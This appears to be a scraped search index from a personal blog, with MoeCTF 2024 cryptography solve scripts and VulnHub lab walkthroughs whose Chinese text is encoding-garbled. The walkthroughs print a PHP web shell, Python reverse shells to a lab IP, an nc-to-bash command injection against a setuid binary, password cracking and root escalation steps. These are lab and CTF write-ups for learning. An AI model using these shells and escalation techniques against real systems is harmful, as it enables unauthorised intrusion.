30099883325957937700435284907440664781247503171217717818782838808179889651361, 85333708281128255260940125642017184300901184334842582132090488518099650581761 q = 105482865285555225519947662900872028851795846950902311343782163147659668129411 x = ((c3 - c2 - c1) * inverse(a3 - a2 - a1, q)) % q gift1 = (c1 - a1 * x) % q gift2 = (c2 - a2 * x) % q gift = (gift1 + gift2) % q flag = long_to_bytes(gift) print(flag) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:9","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"RSA_revenge task from Crypto.Util.number import getPrime, isPrime, bytes_to_long from secret import flag def emirp(x): y = 0 while x !=0: y = y*2 + x%2 x = x//2 return y while True: p = getPrime(512) q = emirp(p) if isPrime(q): break n = p*q e = 65537 m = bytes_to_long(flag) c = pow(m,e,n) print(f\"{n = }\") print(f\"{c = }\") \"\"\" n = 141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901 c = 47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597 \"\"\" æ€è·¯ å¯ä»¥çœ‹çœ‹https://kt.gy/blog/2015/10/asis-2015-finals-rsasr/ exp n = 141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901 def t(a, b, k): if k == 256: if a*b == n: print(a, b) return for i in range(2): for j in range(2): a1 = a + i*(2**k) + j*(2**(511-k)) b1 = b + j*(2**k) + i*(2**(511-k)) if a1*b1 \u003e n: continue if (a1+(2**(511-k)))*(b1+(2**(511-k))) \u003c n: continue if ((a1*b1)%(2**(k+1))) != (n%(2**(k+1))): continue t(a1, b1, k+1) for i in range(2): t(i*(2**256), i*(2**256), 0) p=12119998731259483292178496920109290754181396164390285597126378297678818779092115139911720576157973310671490865211601201831597946479039132512609504866583931 q=11660635291534613230423193509391946961264539191735481147071890944740311229658362673314192872117237108949853531941630122241060679012089130178372253390640871 c=47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597 from Crypto.Util.number import * n=p*q phi=(p-1)*(q-1) d=inverse(65537,phi) m=pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:10","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"One more bit task from Crypto.Util.number import getStrongPrime, bytes_to_long, GCD, inverse from Crypto.Util.Padding import pad from secret import flag import random def genKey(nbits,dbits): p = getStrongPrime(nbits//2) q = getStrongPrime(nbits//2) n = p*q phi = (p-1)*(q-1) while True: d = random.getrandbits(dbits) if d.bit_length() == dbits: if GCD(d, phi) == 1: e = inverse(d, phi) pk = (n, e) sk = (p, q, d) return pk, sk nbits = 1024 dbits = 258 message = pad(flag,16) msg = pad(message, 16) m = bytes_to_long(msg) pk= genKey(nbits, dbits)[0] n, e = pk ciphertext = pow(m, e, n) with open(\"data.txt\",\"w\") as f: f.write(f\"pk = {pk}\\n\") f.write(f\"ciphertext = {ciphertext}\\n\") f.close() æ€è·¯ Boneh_Durfeeæ”»å‡»çš„æ¿å­é¢˜ exp çœç•¥ ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:11","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"EzPack task from Crypto.Util.number import * from secret import flag import random p = 2050446265000552948792079248541986570794560388346670845037360320379574792744856498763181701382659864976718683844252858211123523214530581897113968018397826268834076569364339813627884756499465068203125112750486486807221544715872861263738186430034771887175398652172387692870928081940083735448965507812844169983643977 assert len(flag) == 42 def encode(msg): return bin(bytes_to_long(msg))[2:].zfill(8*len(msg)) def genkey(len): sums = 0 keys = [] for i in range(len): k = random.randint(1,7777) x = sums + k keys.append(x) sums += x return keys key = genkey(42*8) def enc(m, keys): msg = encode(m) print(len(keys)) print(len(msg)) assert len(msg) == len(keys) s = sum((k if (int(p,2) == 1) else 1) for p, k in zip(msg, keys)) print(msg) for p0,k in zip(msg,keys): print(int(p0,2)) return pow(7,s,p) cipher = enc(flag,key) with open(\"output.txt\", \"w\") as fs: fs.write(str(key)+'\\n') fs.write(str(cipher)) æ€è·¯ p-1æ˜¯å…‰æ»‘çš„ï¼Œç›´æ¥DLPï¼Œç„¶åèƒŒåŒ…,æ•°æ®å¤ªå¤§äº†ï¼Œä¸å†™äº† exp from Crypto.Util.number import* from sympy import discrete_log #pow(7,s,p) s=363965742933281351259442199216117822475210003294088371760914916341815880641228470807683148775152284520244 decoded_bits = [] for k in reversed(key): if s \u003e= k: decoded_bits.append('1') s -= k else: decoded_bits.append('0') decoded_bits = ''.join(reversed(decoded_bits)) flag = long_to_bytes(int(decoded_bits, 2)) print(flag) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:12","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"EzMatrix task from Crypto.Util.number import * from secret import FLAG,secrets,SECERT_T assert len(secrets) == 16 assert FLAG == b'moectf{' + secrets + b'}' assert len(SECERT_T) \u003c= 127 class LFSR: def __init__(self): self._s = list(map(int,list(\"{:0128b}\".format(bytes_to_long(secrets))))) for _ in range(8*len(secrets)): self.clock() def clock(self): b = self._s[0] c = 0 for t in SECERT_T:c ^= self._s[t] self._s = self._s[1:] + [c] return b def stream(self, length): return [self.clock() for _ in range(length)] c = LFSR() stream = c.stream(256) print(\"\".join(map(str,stream))[:-5]) # 11111110011011010000110110100011110110110101111000101011001010110011110011000011110001101011001100000011011101110000111001100111011100010111001100111101010011000110110101011101100001010101011011101000110001111110100000011110010011010010100100000000110 æ€è·¯ lfsræ¯æ¬¡ç”Ÿæˆä¸€ä½éƒ½ä¼šå½¢æˆä¸€ä¸ªæ–¹ç¨‹ $$ mask*state_i=state_{i+1} $$æ ¹æ®æ¡ä»¶ï¼Œä¸€å…±æœ‰123ç»„æ–¹ç¨‹ï¼Œç„¶ååè§£å‡ºmask exp from Crypto.Util.number import * from gmpy2 import* def xor(a,b): res=0 for i,j in zip(a,b): if j==1: res^=int(i) return res def rev(stream,mask): temp = [0] + stream[:-1] if xor(temp, mask) == stream[-1]: return temp temp = [1] + stream[:-1] if xor(temp, mask) == stream[-1]: return temp return None lfsr_stream='11111110011011010000110110100011110110110101111000101011001010110011110011000011110001101011001100000011011101110000111001100111011100010111001100111101010011000110110101011101100001010101011011101000110001111110100000011110010011010010100100000000110' M=matrix(Zmod(2),0,128) for i in range(len(lfsr_stream)-128): v=vector([int(x) for x in lfsr_stream[i:i+128]]) M=M.stack(v) res=vector(Zmod(2), [int(x) for x in lfsr_stream[128:]]) mask = M.solve_right(res) for k in range(5): stream = [int(x) for x in lfsr_stream[:128]] for idx in range(16 * 8): tmp = rev(stream, list(mask)) if tmp is None: break stream = tmp flag=int(''.join([str(x) for x in stream]), 2) print(long_to_bytes(flag)) mask += M.right_kernel().basis()[k] ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:13","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"hidden_poly task from Crypto.Util.Padding import pad from Crypto.Util.number import * from Crypto.Cipher import AES import os q = 264273181570520944116363476632762225021 key = os.urandom(16) iv = os.urandom(16) root = 122536272320154909907460423807891938232 f = sum([a*root**i for i,a in enumerate(key)]) assert key.isascii() assert f % q == 0 with open('flag.txt','rb') as f: flag = f.read() cipher = AES.new(key,AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(flag,16)).hex() with open('output.txt','w') as f: f.write(f\"{iv = }\" + \"\\n\") f.write(f\"{ciphertext = }\" + \"\\n\") æ€è·¯ $$ \\sum_{i} a_i*root^i=0\\mod p $$å…¶ä¸­$a_i$éƒ½æ˜¯0åˆ°128ï¼Œå¾ˆå°ï¼Œé‚£ä¹ˆå°±å¯ä»¥å†™æˆ $$ (a_1,Â·Â·Â·,a_15,1)L=(a_1,Â·Â·Â·,a_15,a_0) \\\\ L= \\begin{pmatrix} 1 \u0026 \u0026 root \\\\ \u0026Â· \u0026Â· \\\\ \u00261\u0026 root^{15} \\\\ \u0026\u0026 q \\end{pmatrix} $$ç›´æ¥LLLå°±è¡Œäº† exp iv = b'Gc\\xf2\\xfd\\x94\\xdc\\xc8\\xbb\\xf4\\x84\\xb1\\xfd\\x96\\xcd6\\\\' ciphertext ='d23eac665cdb57a8ae7764bb4497eb2f79729537e596600ded7a068c407e67ea75e6d76eb9e23e21634b84a96424130e' q = 264273181570520944116363476632762225021 root = 122536272320154909907460423807891938232 from Crypto.Util.number import * from Crypto.Cipher import AES L = Matrix(ZZ, 16, 16) for i in range(16 - 1): L[i, i] = 1 L[i, 15] = root ** (i + 1) L[-1, -1] = q L = L.LLL() for res in L: tmp = [] for idx in res: tmp.append(int(abs(idx))) tmp = [tmp[-1]] + tmp[:-1] if all(0 \u003c x \u003c 128 for x in tmp): key = bytearray([x for x in tmp]) cipher = AES.new(key,AES.MODE_CBC, iv) flag = cipher.decrypt(long_to_bytes(int(ciphertext, 16))) print(flag) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:14","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"babe-Lifting from Crypto.Util.number import * from secret import flag p = getPrime(512) q = getPrime(512) n = p*q e = 0x1001 d = inverse(e, (p-1)*(q-1)) bit_leak = 400 d_leak = d \u0026 ((1\u003c\u003cbit_leak)-1) msg = bytes_to_long(flag) cipher = pow(msg,e,n) pk = (n, e) with open('output.txt','w') as f: f.write(f\"pk = {pk}\\n\") f.write(f\"cipher = {cipher}\\n\") f.write(f\"hint = {d_leak}\\n\") f.close() n,e = (53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123, 4097) cipher = 14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054 hint = 1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129 æ€è·¯ dçš„ä½ä½æ³„éœ²æ¿å­ exp from Crypto.Util.number import long_to_bytes,inverse n,e = (53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123, 4097) c = 14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054 dlow = 1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129 def get_full_p(p_low,n,pbits): kbits = p_low.bit_length() R.\u003cx\u003e = PolynomialRing(Zmod(n)) f = x * 2^kbits + p_low f = f.monic() res = f.small_roots(X = 2^(pbits-kbits),beta=0.4) if res != []: p = int(res[0]) * 2^kbits + p_low return p for k in range(e): var('p') f1 = e*dlow*p - (k*n*p - k*p^2 - k*n + (k+1)*p) roots = solve_mod(f1,2^400) if roots != []: for root in roots: if int(root[0]).bit_length() == 400: p = get_full_p(int(root[0]),n,512) if p: q = n // p d = inverse(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) break ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:15","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"ezLCG task from sage.all import * from random import getrandbits, randint from secrets import randbelow from Crypto.Util.number import getPrime,isPrime,inverse from Crypto.Util.Padding import pad from Crypto.Cipher import AES from secret import priKey, flag from hashlib import sha1 import os q = getPrime(160) while True: t0 = q*getrandbits(864) if isPrime(t0+1): p = t0 + 1 break x = priKey assert p % q == 1 h = randint(1,p-1) g = pow(h,(p-1)//q,p) y = pow(g,x,p) def sign(z, k): r = pow(g,k,p) % q s = (inverse(k,q)*(z+r*priKey)) % q return (r,s) def verify(m,s,r): z = int.from_bytes(sha1(m).digest(), 'big') u1 = (inverse(s,q)*z) % q u2 = (inverse(s,q)*r) % q r0 = ((pow(g,u1,p)*pow(y,u2,p)) % p) % q return r0 == r def lcg(a, b, q, x): while True: x = (a * x + b) % q yield x msg = [os.urandom(16) for i in range(5)] a, b, x = [randbelow(q) for _ in range(3)] prng = lcg(a, b, q, x) sigs = [] for m, k in zip(msg,prng): z = int.from_bytes(sha1(m).digest(), \"big\") % q r, s = sign(z, k) assert verify(m, s, r) sigs.append((r,s)) print(f\"{g = }\") print(f\"{h = }\") print(f\"{q = }\") print(f\"{p = }\") print(f\"{msg = }\") print(f\"{sigs = }\") key = sha1(str(priKey).encode()).digest()[:16] iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC,iv) ct = cipher.encrypt(pad(flag,16)) print(f\"{iv = }\") print(f\"{ct = }\") ''' g = 81569684196645348869992756399797937971436996812346070571468655785762437078898141875334855024163673443340626854915520114728947696423441493858938345078236621180324085934092037313264170158390556505922997447268262289413542862021771393535087410035145796654466502374252061871227164352744675750669230756678480403551 h = 13360659280755238232904342818943446234394025788199830559222919690197648501739683227053179022521444870802363019867146013415532648906174842607370958566866152133141600828695657346665923432059572078189013989803088047702130843109809724983853650634669946823993666248096402349533564966478014376877154404963309438891 q = 1303803697251710037027345981217373884089065173721 p = 135386571420682237420633670579115261427110680959831458510661651985522155814624783887385220768310381778722922186771694358185961218902544998325115481951071052630790578356532158887162956411742570802131927372034113509208643043526086803989709252621829703679985669846412125110620244866047891680775125948940542426381 msg = [b'I\\xf0\\xccy\\xd5~\\xed\\xf8A\\xe4\\xdf\\x91+\\xd4_$', b'~\\xa0\\x9bCB\\xef\\xc3SY4W\\xf9Aa\\rO', b'\\xe6\\x96\\xf4\\xac\\n9\\xa7\\xc4\\xef\\x82S\\xe9 XpJ', b'3,\\xbb\\xe2-\\xcc\\xa1o\\xe6\\x93+\\xe8\\xea=\\x17\\xd1', b'\\x8c\\x19PHN\\xa8\\xbc\\xfc\\xa20r\\xe5\\x0bMwJ'] sigs = [(913082810060387697659458045074628688804323008021, 601727298768376770098471394299356176250915124698), (406607720394287512952923256499351875907319590223, 946312910102100744958283218486828279657252761118), (1053968308548067185640057861411672512429603583019, 1284314986796793233060997182105901455285337520635), (878633001726272206179866067197006713383715110096, 1117986485818472813081237963762660460310066865326), (144589405182012718667990046652227725217611617110, 1028458755419859011294952635587376476938670485840)] iv = b'M\\xdf\\x0e\\x7f\\xeaj\\x17PE\\x97\\x8e\\xee\\xaf:\\xa0\\xc7' ct = b\"\\xa8a\\xff\\xf1[(\\x7f\\xf9\\x93\\xeb0J\\xc43\\x99\\xb25:\\xf5\u003e\\x1c?\\xbd\\x8a\\xcd)i)\\xdd\\x87l1\\xf5L\\xc5\\xc5'N\\x18\\x8d\\xa5\\x9e\\x84\\xfe\\x80\\x9dm\\xcc\" ''' from sage.all import * from random import getrandbits, randint from secrets import randbelow from Crypto.Util.number import getPrime,isPrime,inverse from Crypto.Util.Padding import pad from Crypto.Cipher import AES from secret import priKey, flag from hashlib import sha1 import os q = getPrime(160) while True: t0 = q*getrandbits(864) if isPrime(t0+1): p = t0 + 1 break x = priKey assert p % q == 1 h = randint(1,p-1) g = pow(h,(p-1)//q,p) y = pow(g,x,p) def sign(z, k): r = pow(g,k,p) % q s = (inverse(k,q)*(z+r*priKey)) % q return (r,s) def verify(m,s,r): z = int.from_bytes(sha1(m).digest(), 'big') u1 = (inverse(s,q)*z) % q u2 = (inverse(s,q)*r) % q r0 = ((pow(g,u1,p)*pow(y,u2,p)) % p) % q return r0 == r def lcg(","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:16","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["é¶åœº"],"content":"AdmX_new ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:0","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://download.vulnhub.com/admx/AdmX_new.7z ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:1","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ åªæœ‰80ç«¯å£å¼€æ”¾ï¼Œç›´æ¥è®¿é—®æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œdirbæ‰«æå‡ºæ¥wordpressï¼Œè®¿é—®çœ‹çœ‹ï¼Œå‘ç°å¾ˆæ…¢ï¼ŒburpæŠ“åŒ…å‘ç°é‡å®šå‘åˆ°192.168.159.145 ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:2","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"getshell wordpressçš„åå°ç™»é™†åœ¨wp-login.php,çˆ†ç ´è´¦å·å¯†ç å¾—åˆ°admin/adam14,è¿›å…¥åå°ç¬¬ä¸€æ—¶é—´æƒ³ç€å›¾ç‰‡é©¬ä¼ ä¸Šå»ï¼Œç„¶åèšå‰‘è¿æ¥ï¼Œç»“æœä¸€ç›´å¤±è´¥ï¼Œåé¢å‘ç°å¯ä»¥ä¼ æ’ä»¶ï¼Œæ‰“åŒ…æˆzipä¼ ä¸Šå» \u003c?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?\u003e å°è¯•è®¿é—®http://192.168.64.9/wordpress/wp-content/plugins/wordpress_getshell.php?cmd=id å“ï¼Œå¯ä»¥æ‰§è¡Œï¼Œå°è¯•pythonåå¼¹shell python3 -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ192.168.64.3â€,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")â€™ ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:3","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"ææƒ æˆåŠŸä¹‹åsudo -lçœ‹çœ‹æ–‡ä»¶æ‰§è¡Œæƒé™ï¼Œå‘ç° ç›´æ¥æ‰§è¡Œè¿™ä¸ªï¼Œ æˆåŠŸæ‹¿åˆ°root ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:4","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"Empire_LupinOne ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:0","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://www.vulnhub.com/entry/empire-lupinone,750/ ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:1","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"æ‰«æ è®¿é—®80ç«¯å£çœ‹çœ‹ ä¸€ä¸ªå›¾ç‰‡ï¼Œæºç é‡Œé¢ä¹Ÿä»€ä¹ˆéƒ½æ²¡æœ‰ dirbç›´æ¥æ‰«ç›®å½•å•¥éƒ½æ²¡æœ‰ï¼Œrobots.txté‡Œé¢æœ‰ä¸€ä¸ª ä½†æ˜¯è®¿é—®è¿™ä¸ªé¡µé¢åˆæ˜¯ä¸€ä¸ª404,åœ¨æ—§ç‰ˆæœ¬çš„ApacheæœåŠ¡å™¨ä¸­ï¼Œ~ æŒ‡ä»£ç”¨æˆ·ä¸»ç›®å½•ï¼Œå¯ä»¥ç”¨fuzzè¿›è¡Œæµ‹è¯• wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt â€“hc 403,404 http://192.168.64.15/~FUZZ æ‰«æå‡ºæ¥secreté¡µé¢ï¼Œ å¤§æ¦‚å‘ç°æ˜¯æœ‰ä¸ªè´¦å·ï¼Œè¿˜ç¼ºä¸€ä¸ªå¯†ç ï¼Œåœ¨è¿™ä¸ªä¸‹é¢ç»§ç»­æ¢æµ‹ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt â€“hc 404,403 -u http://192.168.64.15/~secret/.FUZZ.txt å‘ç°.mysecret.txtï¼Œè®¿é—®ä¸€ä¸‹ ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:2","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"getshell ä¼°è®¡å°±æ˜¯sshçš„å¯†é’¥ï¼Œä¸è¿‡è¢«ç®€å•çš„åŠ å¯†äº†ï¼Œæ‰”å¨å­é‡Œé¢ï¼Œbase58ç›´æ¥å‡ºæ¥ è¿”å›kaliï¼Œvimä¸€ä¸ªsshkeyï¼Œæ‰”è¿›å»ï¼Œç„¶åç”¨joinæš´åŠ›ç ´è§£ /usr/share/john/ssh2john.py sshkey \u003e hash john â€“wordlist=/usr/share/wordlists/fasttrack.txt hash å¾—åˆ°å¯†ç P@55w0rd! ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:3","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"ææƒ sudo -lçœ‹çœ‹ å¤§æ¦‚æ˜¯è‡ªå·±å†™äº†ä¸ªpythonåº“ï¼Œç„¶åè¿™ä¸ªpythonæ–‡ä»¶å¯ä»¥æ‰§è¡Œä»–ï¼Œè€Œä¸”æ˜¯å¦ä¸€ä¸ªå·çš„æƒé™ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è¿™ä¸ªææƒï¼Œ find /usr/ -name â€˜webbrowserâ€™ /usr/lib/python3.9/webbrowser.py å¾€é‡Œé¢å†™ä¸€ä¸ªbinshè¯•è¯•ï¼ˆè¿™ä¸ªé¶æœºæ€ä¹ˆviméƒ½æ²¡æœ‰å•Šå•Šï¼‰ æ‰§è¡Œä¹‹åç¡®å®æå‡æƒé™äº†ï¼Œä½†æ˜¯è¿˜ä¸æ˜¯rootï¼Œå†æ¥sudo -lä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥æ‰§è¡Œpipï¼Œç›´æ¥pipææƒ è¿™ä¸ªæ—¶å€™å°±ç»“æŸäº† ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:4","tags":["æ¸—é€"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["é¶åœº"],"content":"EvilBox: One ","date":"2024-12-12","objectID":"/vuln_hmv1/:1:0","tags":["æ¸—é€"],"title":"Vuln EvilBox: One \u0026 BoredHackerBlog_Cloud_AV","uri":"/vuln_hmv1/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://www.vulnhub.com/entry/evilbox-one,736/ æ—¥å¸¸æ‰«æ å‘ç°è¿™ç©æ„é¶æœºï¼ˆè¿™ä¸ªéœ€è¦è‡ªå·±é…ç½®ä¸€ä¸‹ç½‘å¡ï¼‰ nmapæ‰«æç«¯å£ æ²¡æœ‰ç”¨ï¼Œdisæˆ–è€…æ˜¯dirbæ‰«ä¸€ä¸‹ å‘ç°è¿™å‡ ä¸ªï¼Œä¸€ä¸ªä¸€ä¸ªç‚¹è¿›å»çœ‹ä¸€çœ¼ï¼Œhttp://192.168.64.4/secret/ ç½‘é¡µæ˜¯çº¯ç™½çš„ï¼Œ çˆ†ç ´ æ‰«ä¸€ä¸‹å°¾ç¼€å‘ç°çœŸæœ‰.phpï¼ŒbpæŠ“åŒ…çœ‹ä¸€ä¸‹ ç”¨fuzzçˆ†ç ´ä¸€ä¸‹ï¼Œ å‘ç° mowreeâŒ1000:1000:mowree,,,:/home/mowree:/bin/bash å¯èƒ½æ˜¯sshçš„ç”¨æˆ·ï¼Œé¡µé¢ä¸Šå»çœ‹ä¸€æ ·æ˜¯å¯†ç ï¼Œgptæ ¼å¼åŒ–ä¸€ä¸‹ johnå»çˆ†ç ´ç§é’¥ python /usr/share/john/ssh2john.py id_rsa \u003e hash john hash å¾—åˆ°å¯†ç æ˜¯unicorn sshææƒ sshä¸Šå» å‘ç°/etc/passwdå¯ä»¥ä¿®æ”¹ï¼Œç›´æ¥openssl passwd -1ç”Ÿæˆå¯†ç ï¼Œç„¶åæŠŠrootåé¢çš„xæ”¹äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥ç”¨https://blog.csdn.net/weixin_46700042/article/details/108813878 linpeasè¿‡ä¸¤å¤©è€ƒå®Œè¯•å†å­¦å­¦æ€ä¹ˆç”¨ï¼ˆï¼‰ ","date":"2024-12-12","objectID":"/vuln_hmv1/:1:1","tags":["æ¸—é€"],"title":"Vuln EvilBox: One \u0026 BoredHackerBlog_Cloud_AV","uri":"/vuln_hmv1/"},{"categories":["é¶åœº"],"content":"BoredHackerBlog_Cloud_AV ","date":"2024-12-12","objectID":"/vuln_hmv1/:2:0","tags":["æ¸—é€"],"title":"Vuln EvilBox: One \u0026 BoredHackerBlog_Cloud_AV","uri":"/vuln_hmv1/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/ æ—¥å¸¸æ‰«æ å‘ç°é¶æœºï¼Œnmapå¯åŠ¨ æœ‰ä¸ªhttpæœåŠ¡é¡µé¢ï¼Œä¸Šå»çœ‹ä¸€çœ¼ sqlæ³¨å…¥/å¯†ç çˆ†ç ´ ç™»é™†æ¡†é¡µé¢ï¼Œsqlæ³¨å…¥/å¯†ç çˆ†ç ´éƒ½å¯ä»¥ï¼Œå½“ç„¶äº†ï¼Œèº«ä¸ºå¯†ç æ‰‹ï¼Œç›´æ¥å¼±å¯†é’¥è¯•è¯•ï¼Œpasswordç›´æ¥è¿›å»äº†ï¼ˆï¼‰ åå¼¹shell é‡Œé¢è¿˜æœ‰ä¸ªæ¡†ï¼Œè¯•ä¸€ä¸‹ç®¡é“ç¬¦æ‹¼æ¥ï¼Œæ²¡å•¥ç”¨ï¼Œæœ‰pythonï¼Œç›´æ¥åå¼¹shellæ‰”è¿›å» 1|python -c â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ192.168.64.3â€,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);â€™ æœ¬åœ°å¼€ncç›‘å¬ä¸€ä¸‹ æœ‰ä¸ª.appå’Œ.sqlï¼Œå¯èƒ½æ˜¯è´¦å·å¯†ç ä»€ä¹ˆçš„ï¼Œç›´æ¥æ‹‰å–åˆ°æœ¬åœ° å‘ç°æ˜¯å¯†ç ï¼Œé¶æœºæœ‰22ç«¯å£ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½sshï¼Œå°è¯•çˆ†ç ´åæ²¡æœ‰ç”¨ æŸ¥äº†ä¸€ä¸‹åº”è¯¥æ˜¯suidææƒï¼ˆï¼‰ find / -perm /4000 -type f 2\u003e/dev/null å‘ç°scannerè¿™ä¸ªï¼Œåˆšæ‰ç”¨è¿‡ï¼Œå¯èƒ½è¿˜æ˜¯åœ¨è¿™é‡Œï¼Œè¿›å…¥æ–‡ä»¶å¤¹ï¼Œçœ‹ä¸€ä¸‹æƒé™ å‘ç°rootäº†ï¼Œç”šè‡³æœ‰ä¸ª.cæ–‡ä»¶ï¼Œçœ‹çœ‹ #include \u003cstdio.h\u003e int main(int argc, char *argv[]) { char *freshclam=\"/usr/bin/freshclam\"; if (argc \u003c 2){ printf(\"This tool lets you update antivirus rules\\nPlease supply command line arguments for freshclam\\n\"); return 1; } char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2); sprintf(command, \"%s %s\", freshclam, argv[1]); setgid(0); setuid(0); system(command); return 0; } æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ClamAVæ˜¯ä¸€ä¸ªlinuxçš„ç—…æ¯’æ‰«æè½¯ä»¶ã€‚freshclamç›¸å½“äºæ˜¯ä¸€ä¸ªæ›´æ–°clamavçš„ç—…æ¯’åº“çš„åŠŸèƒ½ã€‚åŒæ—¶å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œçš„é•¿åº¦çš„é™åˆ¶ï¼ŒåŒæ—¶è¦æ±‚å¿…é¡»æœ‰å‚æ•°çš„ä¼ å…¥ã€‚è¿™ç©æ„å‚æ•°ä¼šæ‰”åˆ°systemæ‰§è¡Œï¼Œé‚£ä¹ˆåå¼¹shellè¯•è¯• ./update_cloudav â€œaasff | nc 192.168.64.3 5000 | /bin/bash | nc 192.168.64.3 6000â€ 